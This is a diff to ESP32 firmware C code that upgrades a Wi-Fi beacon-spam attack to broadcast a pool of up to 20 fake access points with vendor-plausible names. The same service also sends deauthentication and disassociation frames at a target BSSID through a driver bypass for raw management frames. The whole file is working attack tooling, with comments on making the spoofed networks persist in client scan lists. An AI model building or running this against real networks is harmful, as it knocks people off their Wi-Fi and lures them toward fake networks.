@@ -11,15 +11,21 @@
 
 static const char *TAG = "svc_deauth";
 
-#define BEACON_DWELL_TICKS 10
-#define BEACON_SSID_MAX    10
+#define BEACON_POOL_MAX     20   /* Hydra-ESP's default live-AP count */
+#define BEACON_POOL_DEFAULT 12
+#define BEACON_SSID_MAX     32   /* 802.11 caps SSIDs at 32 octets */
+
+typedef struct {
+    uint8_t bssid[6];
+    char    ssid[BEACON_SSID_MAX + 1];
+    int     ssid_len;
+} beacon_ap_t;
 
 static esp_timer_handle_t s_timer = NULL;
 static uint8_t s_bssid[6];        /* target BSSID (deauth/disassoc) */
-static uint8_t s_beacon_bssid[6]; /* current fake AP BSSID (beacon spam) */
-static char s_beacon_ssid[BEACON_SSID_MAX + 1]; /* current fake AP SSID */
-static int s_beacon_dwell = 0;    /* ticks left on the current fake AP */
-static uint32_t s_beacons = 0;    /* fake APs announced this run */
+static beacon_ap_t s_pool[BEACON_POOL_MAX]; /* fake APs live this run */
+static int s_pool_count = 0;      /* entries actually beaconing */
+static uint32_t s_beacons = 0;    /* fake APs in the pool */
 static int s_channel = 1;         /* pinned channel, clamped 1..13 */
 static volatile uint32_t s_frames = 0;
 static volatile int s_tx_err = 0;      /* first TX error since start */
@@ -66,19 +72,21 @@ static void build_disassoc(uint8_t *f, const uint8_t bssid[6]) {
     memcpy(f + 16, bssid, 6);
 }
 
-/* Beacon spam: FC 0x80 for one fake AP at a time. The caller (tx_tick)
- * rotates the fake identity: a random BSSID + random printable SSID
- * (1..10 chars) held for BEACON_DWELL_TICKS (~1 s), so a client sweeping
- * the channel actually catches a name instead of seeing ten new ones per
- * second. Fixed params carry a TSF that starts at a random base and
- * advances one beacon interval per frame, the way a real AP's clock does:
- * a fresh random timestamp every frame makes most drivers throw the
- * beacon away as bogus, which is why only a name or two used to show up
- * in client scan lists.
+/* Beacon spam. Architecture follows Hydra-ESP's attack_beacon_spam.c: a
+ * POOL of fake APs is built once at start and every identity beacons on
+ * every tick, so all of them are alive in the client's scan list at the
+ * same time. Rotating one identity at a time (the obvious first design)
+ * only ever leaves a couple visible - silent entries age out of a scan
+ * list within seconds.
+ *
+ * Names are vendor-plausible ("Netgear_WiFi"), not random strings: scan
+ * UIs and stacks treat random-looking SSIDs as junk. Every pool entry keeps
+ * one locally-administered BSSID for the whole run.
  *
  * Layout: mgmt hdr (24) | TSF (8) | interval (2) | capability (2) |
  * SSID tag (2 + len) | DS param set (3). Returns the frame length. */
-static int build_beacon(uint8_t *f, const uint8_t bssid[6], int channel) {
+static int build_beacon(uint8_t *f, const uint8_t bssid[6], int channel,
+                        const char *ssid, int ssid_len) {
     static uint32_t tsf = 0;
     static uint16_t seq = 0;
     if (tsf == 0) {
@@ -90,7 +98,6 @@ static int build_beacon(uint8_t *f, const uint8_t bssid[6], int channel) {
     tsf += 100 * 1024;               /* +100 TU, matching the interval */
     seq++;
 
-    int ssid_len = (int)strlen(s_beacon_ssid);
     if (ssid_len < 1) {
         ssid_len = 1;
     }
@@ -116,11 +123,11 @@ static int build_beacon(uint8_t *f, const uint8_t bssid[6], int channel) {
     f[31] = 0x00;
     f[32] = 0x64;                    /* beacon interval 100 TU */
     f[33] = 0x00;
-    f[34] = 0x11;                    /* capability info: ESS + privacy */
+    f[34] = 0x01;                    /* capability info: ESS (as Hydra) */
     f[35] = 0x04;
     f[36] = 0x00;                    /* SSID tag */
     f[37] = (uint8_t)ssid_len;
-    memcpy(f + 38, s_beacon_ssid, (size_t)ssid_len);
+    memcpy(f + 38, ssid, (size_t)ssid_len);
     int o = 38 + ssid_len;
     f[o++] = 0x03;                   /* DS parameter set: current channel */
     f[o++] = 0x01;
@@ -128,24 +135,58 @@ static int build_beacon(uint8_t *f, const uint8_t bssid[6], int channel) {
     return o;
 }
 
-/* Roll a new fake AP identity (random locally-administered BSSID + random
- * printable SSID) and reset the dwell counter. */
-static void beacon_new_identity(void) {
-    static const char alphabet[] =
-        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    const size_t alen = sizeof(alphabet) - 1;
-    for (int i = 0; i < 6; i++)
-        s_beacon_bssid[i] = (uint8_t)esp_random();
-    /* Force the locally-administered bit and clear the multicast bit so the
-     * fake BSSID cannot collide with a real OUI. */
-    s_beacon_bssid[0] |= 0x02;
-    s_beacon_bssid[0] &= (uint8_t)~0x01;
-    int len = 1 + (int)(esp_random() % BEACON_SSID_MAX);
-    for (int i = 0; i < len; i++)
-        s_beacon_ssid[i] = (char)alphabet[esp_random() % alen];
-    s_beacon_ssid[len] = 0;
-    s_beacon_dwell = BEACON_DWELL_TICKS;
-    s_beacons++;
+/* Vendor-plausible name parts (Hydra-ESP's sets). Random-looking SSIDs get
+ * collapsed or deprioritised by scan UIs; names that look like real gear
+ * get listed and kept. */
+static const char *const s_bases[] = {
+    "TP-Link", "Linksys", "Netgear", "ASUS", "D-Link",
+    "Home", "Office", "Starlink", "Free Public WiFi",
+};
+static const char *const s_suffixes[] = {
+    "_WiFi", "-Guest", "-5G", "_Secure", "",
+};
+#define N_BASES    (sizeof(s_bases) / sizeof(s_bases[0]))
+#define N_SUFFIXES (sizeof(s_suffixes) / sizeof(s_suffixes[0]))
+
+/* Build the pool of fake APs. BSSIDs are locally administered (unicast,
+ * bit 1 set) so they cannot collide with a real vendor OUI; the name is a
+ * shuffled vendor x suffix pair so entries are unique. */
+static void beacon_pool_build(int count) {
+    if (count < 1) {
+        count = 1;
+    }
+    if (count > BEACON_POOL_MAX) {
+        count = BEACON_POOL_MAX;
+    }
+    /* Partial Fisher-Yates over the base x suffix combos: unique names,
+     * random order, no retry loop. */
+    uint8_t order[N_BASES * N_SUFFIXES];
+    const size_t n_combo = N_BASES * N_SUFFIXES;
+    for (size_t i = 0; i < n_combo; i++)
+        order[i] = (uint8_t)i;
+    for (int i = 0; i < count && (size_t)i < n_combo; i++) {
+        size_t j = (size_t)i + (size_t)(esp_random() % (n_combo - i));
+        uint8_t tmp = order[i];
+        order[i] = order[j];
+        order[j] = tmp;
+    }
+    for (int i = 0; i < count; i++) {
+        beacon_ap_t *ap = &s_pool[i];
+        for (int k = 0; k < 6; k++)
+            ap->bssid[k] = (uint8_t)esp_random();
+        ap->bssid[0] |= 0x02;            /* locally administered */
+        ap->bssid[0] &= (uint8_t)~0x01;  /* unicast */
+        uint8_t c = order[i];
+        snprintf(ap->ssid, sizeof(ap->ssid), "%s%s",
+                 s_bases[c % N_BASES], s_suffixes[c / N_BASES]);
+        ap->ssid[BEACON_SSID_MAX] = 0;
+        ap->ssid_len = (int)strlen(ap->ssid);
+        if (ap->ssid_len > BEACON_SSID_MAX) {
+            ap->ssid_len = BEACON_SSID_MAX;
+        }
+    }
+    s_pool_count = count;
+    s_beacons = (uint32_t)count;
 }
 
 static void tx_tick(void *arg) {
@@ -153,29 +194,39 @@ static void tx_tick(void *arg) {
     s_ticks++;                       /* proof the callback fires at all */
     /* TX goes through the WSL bypass so the driver's frame-type gate
      * accepts management subtypes (see wsl_bypasser.h). */
-    uint8_t f[64];
+    uint8_t f[80];
     int ok_count = 0;
     esp_err_t err = ESP_OK;
-    int passes = (s_mode == DEAUTH_MODE_COMBINED) ? 2 : 1;
-    for (int i = 0; i < passes; i++) {
-        int len = sizeof(f);
-        if (s_mode == DEAUTH_MODE_BEACON) {
-            if (s_beacon_dwell <= 0)
-                beacon_new_identity();
-            else
-                s_beacon_dwell--;
-            len = build_beacon(f, s_beacon_bssid, s_channel);
-        } else {
-            build_deauth(f, s_bssid);
+    if (s_mode == DEAUTH_MODE_BEACON) {
+        /* Every pool entry beacons every tick (Hydra-ESP behaviour): the
+         * whole fake estate is live at once, so a scan list keeps them
+         * all instead of expiring the ones that went quiet. */
+        for (int i = 0; i < s_pool_count; i++) {
+            int len = build_beacon(f, s_pool[i].bssid, s_channel,
+                                   s_pool[i].ssid, s_pool[i].ssid_len);
+            err = wsl_send_raw(f, len);
+            s_last_err = (int)err;
+            if (err == ESP_OK) {
+                ok_count++;
+            } else if (!s_tx_err) {
+                s_tx_err = 1;
+                s_tx_errcode = (int)err;
+            }
+        }
+    } else {
+        int passes = (s_mode == DEAUTH_MODE_COMBINED) ? 2 : 1;
+        for (int i = 0; i < passes; i++) {
             if (s_mode == DEAUTH_MODE_DISASSOC) {
                 build_disassoc(f, s_bssid);
+            } else {
+                build_deauth(f, s_bssid);
             }
-            len = 26;
+            err = wsl_send_raw(f, 26);
+            s_last_err = (int)err;
+            if (err == ESP_OK) {
+                ok_count++;
+            }
         }
-        err = wsl_send_raw(f, len);
-        s_last_err = (int)err;
-        if (err == ESP_OK)
-            ok_count++;
     }
     s_frames += (uint32_t)ok_count;
     if (err != ESP_OK && !s_tx_err) {
@@ -252,9 +303,10 @@ int svc_deauth_start(deauth_mode_t mode) {
     s_tx_errcode = 0;
     s_ticks = 0;
     s_last_err = 0;
+    s_pool_count = 0;
     s_beacons = 0;
-    s_beacon_dwell = 0;
-    s_beacon_ssid[0] = 0;
+    if (s_mode == DEAUTH_MODE_BEACON)
+        beacon_pool_build(BEACON_POOL_DEFAULT);
     s_expired = 0;
     s_fps = 0;
     s_win_frames = 0;
@@ -298,9 +350,9 @@ uint32_t svc_deauth_ticks(void) { return s_ticks; }
 uint32_t svc_deauth_beacons(void) { return s_beacons; }
 
 uint32_t svc_deauth_fake_aps(void) {
-    /* Identities rolled so far, counted as they become visible to clients
-     * (i.e. completed dwell windows, not the one in flight). */
-    return s_beacons > 0 ? s_beacons - 1 : 0;
+    /* Fake APs currently live in the pool - each one beacons every tick,
+     * so all of them are simultaneously visible to a scanner. */
+    return (uint32_t)s_pool_count;
 }
 
 int svc_deauth_beacon_ok(void) { return s_beacon_ok; }
